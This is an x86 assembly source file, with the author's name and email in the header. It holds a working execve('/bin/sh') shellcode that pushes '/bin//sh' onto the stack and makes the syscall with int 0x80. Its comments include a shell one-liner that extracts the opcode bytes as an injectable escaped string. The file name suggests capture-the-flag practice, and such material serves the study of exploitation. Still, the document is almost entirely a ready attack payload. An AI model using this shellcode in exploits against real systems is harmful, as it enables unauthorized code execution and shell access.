; Author: Abhinav Thakur
; Email : compilepeace@gmail.com
; Description : spawns "/bin/sh" by hopping at every .

; Compile : yasm -f elf ./read_flag.asm
; Harness : $ for i in $(objdump -d ./shell.o | grep "^ " | cut -f2);do echo -n \\x$i; done
; x86 system calling convention : eax (syscall number) | ebx ecx edx esi edi ebp
; x86-64 sys calling convention : rax (syscall number) | rdi rsi rdx rcx r8  r9 

segment .text
global _start
_start:

    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
    xor eax, eax
    push eax
    mov edx, esp            ; edx = "\x00\x00\x00\x00"
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; ebx = "/bin/sh\x00"
    push eax
    push ebx
    mov ecx, esp            ; ecx = ["/bin/sh", NULL]
    mov al, 0xb             ; eax = 0xb
    int 0x80